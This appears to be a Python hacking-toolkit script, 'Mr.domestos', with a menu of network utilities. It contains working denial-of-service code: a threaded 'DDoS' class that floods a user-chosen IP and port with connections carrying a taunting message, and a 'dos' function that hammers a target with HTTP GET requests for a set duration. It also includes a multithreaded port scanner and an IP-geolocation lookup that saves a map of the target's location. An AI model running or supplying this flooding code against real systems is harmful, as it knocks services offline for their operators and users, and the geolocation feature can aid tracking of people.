
import os
import platform
import socket
import datetime
import threading
from colorama import Fore, Back, Style, init
import sys
from getmac import get_mac_address
import psutil
import pyfiglet
import requests
import folium
from concurrent.futures import ThreadPoolExecutor, as_completed
import time
from tqdm import tqdm
import keyboard


result = pyfiglet.figlet_format("Mr.domestos")

HOSTNAME = socket.gethostname()
IP = socket.gethostbyname(HOSTNAME)
init(autoreset=True)




def main_menu():
    print(f"{result}\n\n"
          f"{Style.BRIGHT + Fore.BLUE + "Options:"}\n\n"
          f"{Fore.GREEN + " [1]Check port"}\n"
          f"{Fore.GREEN + " [2]System info"}\n"
          f"{Fore.GREEN + " [3]DDoS attack"}\n"
          f"{Fore.GREEN + " [4]DOS attack"}\n"
          f"{Fore.GREEN + " [5]Port scanner"}\n"
          f"{Fore.GREEN + " [6]Get a MAC address using IP"}\n"
          f"{Fore.GREEN + " [7]By punching through the IP"}\n"
          f"{Fore.GREEN + " [8]Check IP for VPN / proxy"}\n"
          f"{Fore.GREEN + " [9]Monitoring network activity on a local network"}\n"  
          f"{Fore.RED +   " [10]Exit"}\n\n")


    while True:
        try:

            user_choice = int(input(Style.BRIGHT + Fore.YELLOW + "Choose an option >>>>"))


            if user_choice == 1:
                start_check_port()

            elif user_choice == 2:
                system_info()

            elif user_choice == 3:
                start_dodos()


            elif user_choice == 4:
                start_dos()

            elif user_choice == 5:
                start_port_scanner()

            elif user_choice ==6:
                start_get_mac_by_ip()

            elif user_choice ==7:
                start_punching_through_the_ip()

            elif user_choice ==8:
                start_check_vpn_or_proxy()

            elif user_choice ==9:
                check_connections()

            elif user_choice == 10:
                return sys.exit(0)


            else:
                print(Style.BRIGHT + Fore.RED + "This option is absent")
                time.sleep(2)
                return main_menu()



        except Exception as e:
            print(Back.RED + f"Error: {e}")
            time.sleep(2)
            return main_menu()





def start_check_port():
    try:
        target_ip = input(Style.BRIGHT + Fore.GREEN + "Enter target IP >>>>")
        target_port = int(input(Style.BRIGHT + Fore.GREEN + "Enter target port >>>>"))
        return check_port(target_ip, target_port)


    except Exception as e:
        print(Back.RED + f"error: {e}")
        time.sleep(2)
        return main_menu()

def check_port(target_ip : str, target_port : int):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        result = sock.connect_ex((target_ip, target_port))

        if result == 0:
            print(Back.GREEN + f"Port {target_port} is open")
            return time.sleep(2)

        else:
            print(Back.RED + f"Port {target_port} is closed")
            return time.sleep(2)

    except Exception as e:
        print(Back.RED + f"Error: {e}")
        time.sleep(2)
        return main_menu()


def system_info():
    mac = get_mac_address()
    system = platform.system()
    os_version = platform.version()
    architecture = platform.architecture()
    processor = platform.processor()
    pid = os.getpid()
    cpu_cores = os.cpu_count()
    memory = psutil.virtual_memory()
    boot_time = psutil.boot_time()

    system_info = {
        "hostname:": HOSTNAME,
        "IP adress:": IP,
        "MAC adress:": mac,
        "operation system:": system,
        "operation system version:": os_version,
        "architecture:": architecture,
        "processor:": processor,
        "pid:": pid,
        "number of CPU cores:": cpu_cores,
        "total memory:": f"{memory.total / (1024 ** 3):.2f} GB",
        "free memory:": f"{memory.available / (1024 **3):.2f} GB",
        "memory used:": f"{memory.used / (1024 ** 3):.2f} GB",
        "system load:": f"{datetime.datetime.fromtimestamp(boot_time).strftime('%Y-%m-%d %H:%M:%S')}",
    }

    for key, value in system_info.items():
        print(Style.BRIGHT + Fore.BLUE + f"{key}",value)





def start_dodos():
    try:
        target_ip = input(Style.BRIGHT + Fore.GREEN + "Enter target IP >>>>")
        target_port = int(input(Style.BRIGHT + Fore.GREEN + "Enter target port >>>>"))
        number_of_threads = int(input(Style.BRIGHT + Fore.GREEN + "Enter number of threads >>>>"))
        ddos_object = DDoS(target_ip, target_port, number_of_threads)
        ddos_object.start()
        input(Style.BRIGHT + Fore.GREEN + "Press ENTER to stop .......\n")


    except Exception as e:
        print(Back.RED + f"error: {e}")
        time.sleep(2)
        main_menu()

    finally:
        ddos_object.stop()
        main_menu()


class DDoS:
    def __init__(self,target_ip : str,target_port : int,number_of_threads : int):
        self.target_ip = target_ip
        self.target_port = target_port
        self.number_of_threads = number_of_threads
        self.is_running = False
        self.threads = []

    def attack(self):
        while self.is_running:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(1)
                s.connect((self.target_ip, self.target_port))
                s.send(b"Mr.domestos is angry. Please make win + x")
                s.close()
            except Exception as e:
                continue
            time.sleep(0.3)

    def start(self):
        if self.is_running:
            print(Fore.GREEN + "The attack has already been launched")
            time.sleep(2)
            return

        print(Fore.GREEN + f"Launching an attack on: {self.target_ip}:{self.target_port}")
        self.is_running = True

        with tqdm(total=self.number_of_threads, desc="Starting threads") as pbar:
            for _ in range(self.number_of_threads):
                thread = threading.Thread(target=self.attack)
                thread.daemon = True
                thread.start()
                self.threads.append(thread)
                pbar.update(1)

        print(Fore.GREEN + "Attack is running")
        time.sleep(2.5)

    def stop(self):
        if not self.is_running:
            print(Fore.RED + "The attack has not been launched")
            time.sleep(2)
            return

        print(Fore.GREEN + "Stopping the attack...")
        self.is_running = False

        for thread in self.threads:
            thread.join()

        self.threads = []
        print(Style.BRIGHT + Back.GREEN + "The attack has been successfully stopped")
        time.sleep(2)
        main_menu()

def start_dos():
    try:
        target_ip = input(Style.BRIGHT + Fore.GREEN + "Enter target IP >>>>")
        target_port = int(input(Style.BRIGHT + Fore.GREEN + "Enter target port >>>>"))
        duration = int(input(Style.BRIGHT + Fore.GREEN + "Enter duration >>>>"))
        return dos(target_ip,target_port,duration)





    except Exception as e:
        print(Back.RED + f"Error: {e}")
        time.sleep(2)
        return main_menu()



def dos(target_ip : str,target_port : str ,duration : int):


    try:
        s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)

        print(Style.BRIGHT + Fore.GREEN + f"I'm launching a Dos attack for {target_ip}:{target_port} a duration of {duration}seconds")


        timeout = time.time() + duration
        requests_count = 0

        while time.time() < timeout:
            try:


                s.connect((target_ip,target_port))


                s.sendto(("GET / HTTP/1.1\r\n").encode("ascii"),(target_ip,target_port))

                requests_count +=1

                print(Style.BRIGHT + Fore.GREEN + f"Requests sent: {requests_count} time to end : {timeout - time.time()} seconds")


                s.close()

                s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)


            except socket.error as e:
                print(Fore.RED + f"Connection error : {e}")
                time.sleep(1.5)
                s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)

    except KeyboardInterrupt:
        pass


    except Exception as e:
        print(Back.RED + f"Error: {e}")
        time.sleep(2)
        return main_menu()

    finally:
        s.close()
        print(Style.BRIGHT + Fore.GREEN + f"total requests sent : {requests_count}")
        print(Back.GREEN + "the attack was successfully stopped")
        time.sleep(2)







def start_port_scanner():
    try:
        target_ip = input(Style.BRIGHT + Fore.GREEN + "Enter target IP >>>> ")
        target_start_port = int(input(Style.BRIGHT + Fore.GREEN + "Enter target start port >>>> "))
        target_last_port = int(input(Style.BRIGHT + Fore.GREEN + "Enter target last port >>>> "))
        treads = int(input(Style.BRIGHT + Fore.GREEN + "Enter the number of threads to scan (the system may be loaded if the number of threads is large) >>>> "))
        return port_scanner(target_ip, target_start_port, target_last_port,treads)



    except Exception as e:
        print(Back.RED + f"Error: {e}")
        time.sleep(2)
        return main_menu()



def scan_port(target_ip: str, port: int):
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
            sock.settimeout(1)
            result = sock.connect_ex((target_ip, port))
            if result == 0:
                return port

    except Exception as e:
        print(Back.RED + f"Error: {e}")
        time.sleep(2)
        return main_menu()



def port_scanner(target_ip: str, target_start_port: int, target_last_port: int,threads : int):
    try:

        if target_start_port > target_last_port:
            print(Style.BRIGHT + Fore.RED + "The starting port cannot be larger than the last port.")
            time.sleep(2)

        if target_start_port <= 0 or target_last_port <= 0:
            print(Style.BRIGHT + Fore.RED + "The port values cannot be negative")
            time.sleep(2)



        if threads <= 0:
            print(Style.BRIGHT + Fore.RED + "The threads values cannot be negative")
            time.sleep(2)

        try:
            open_ports = []
            ports_to_scan = range(target_start_port, target_last_port + 1)
            max_threads = min(threads, len(ports_to_scan))

            print(Style.BRIGHT + Fore.GREEN + "Creating threads....")

            with ThreadPoolExecutor(max_workers=max_threads) as executor:
                futures = {executor.submit(scan_port, target_ip, port): port for port in ports_to_scan}

                with tqdm(total=len(ports_to_scan), desc="Scanning ports",colour="green") as pbar:
                    for future in as_completed(futures):
                        port = futures[future]
                        try:
                            result = future.result()
                            if result is not None:
                                open_ports.append(result)
                        except Exception as e:
                            print(Back.RED + f"Error scanning port {port}: {e}")
                            time.sleep(2)

                        finally:
                            pbar.update(1)

            print(Back.GREEN + f"Open ports: {sorted(open_ports)}")
            time.sleep(2)

        except Exception as e:
            print(Back.RED + f"Error: {e}")
            time.sleep(2)
            main_menu()



    except Exception as e:
        print(Back.RED + f"Error: {e}")
        time.sleep(2)
        main_menu()


def start_get_mac_by_ip():
    try:
        target_ip = input(Style.BRIGHT + Fore.GREEN + "Enter target IP >>>>")
        return get_mac_by_ip(target_ip)


    except Exception as e:
        print(Back.RED + f"Error: {e}")
        time.sleep(2)
        main_menu()









def get_mac_by_ip(target_ip : str):
    try:

        mac_adress = get_mac_address(ip=target_ip)

        print(Back.GREEN + f"MAC adress by IP adress {target_ip} : {mac_adress}")
        time.sleep(2)


    except Exception as e:
        print(Back.RED + f"Error: {e}")
        time.sleep(2)
        main_menu()



def start_punching_through_the_ip():

    try:

        target_ip = input(Style.BRIGHT + Fore.GREEN + "Enter target IP >>>>")
        return punching_through_the_ip(target_ip)







    except Exception as e:
        print(Back.RED + f"Error: {e}")
        time.sleep(2)
        main_menu()




def punching_through_the_ip(target_ip):
    try:

        url = f"http://ip-api.com/json/{target_ip}"
        response =  requests.get(url).json()

        ip_info = {
            "IP:": response.get("query"),
            "internet service provider:": response.get("isp") ,
            "organization": response.get("org"),
            "country": response.get("country"),
            "region:": response.get("regionName"),
            "city:": response.get("city"),
            "ZIP:": response.get("zip"),
            "latitude:": response.get("lat") ,
            "longitude:" : response.get("lon")
        }

        for key, value in ip_info.items():
            print(Style.BRIGHT + Fore.GREEN + f"{key}", value)



        area = folium.Map(location=[response.get("lat"),response.get("lon")])
        name = f"{response.get("query")}_{response.get("city")}_{time.time()}"
        area.save(f"{name}.html")
        print(Back.GREEN + f"the latitude and longitude data has been successfully saved in the file as {name}")

    except requests.exceptions.ConnectionError:
        print(Back.RED + f"Please check your connection to internet")
        time.sleep(2)
        main_menu()




    except requests.exceptions.RequestException as e:
        print(Back.RED + f"Request error: {e}")
        time.sleep(2)
        return main_menu()



    except Exception as e:
        print(Back.RED + f"Error: {e}")
        time.sleep(2)
        main_menu()



def start_check_vpn_or_proxy():
    try:
        target_ip = input(Style.BRIGHT + Fore.GREEN + "Enter target IP >>>>")
        return check_vpn_or_proxy(target_ip)


    except Exception as e:
        print(Back.RED + f"Error: {e}")
        time.sleep(2)
        return main_menu()

def check_vpn_or_proxy(target_ip: str):
    try:
        url = f"https://blackbox.ipinfo.app/lookup/{target_ip}"
        response = requests.get(url)

        if response.status_code != 200:
            print(Back.RED + f"API request failed with status {response.status_code}")
            time.sleep(2)
            return main_menu()

        result = response.text.strip()

        if result == "Y":
            print(Fore.RED + "VPN / proxy detected")
            time.sleep(3)
        else:
            print(Fore.GREEN + "VPN / proxy not detected")
            time.sleep(3)

        time.sleep(2)


    except requests.exceptions.ConnectionError:
        print(Back.RED + f"Please check your connection to internet")
        time.sleep(2)
        main_menu()


    except requests.exceptions.RequestException as e:
        print(Back.RED + f"Request error: {e}")
        time.sleep(2)
        return main_menu()


    except Exception as e:
        print(Back.RED + f"Error: {e}")
        time.sleep(2)
        return main_menu()




def check_connections():
    all_connections = 0
    connections = [conn for conn in psutil.net_connections() if conn.status == 'ESTABLISHED']
    with tqdm(connections , desc="Check connections") as pbar:
        for conn in psutil.net_connections():
            if conn.status == 'ESTABLISHED':
                time.sleep(0.5)
                print(Style.BRIGHT + Fore.BLUE + f"         Connection : local IP : {conn.laddr.ip}   local port : {conn.laddr.port} -> remote IP : {conn.raddr.ip}   remote port : {conn.raddr.port} time : {datetime.datetime.now()}")
                all_connections +=1
                pbar.update(1)
                time.sleep(1)

    print(Back.GREEN + f"Total connected devices : {all_connections}")
    time.sleep(3)



if __name__ == "__main__":
    main_menu()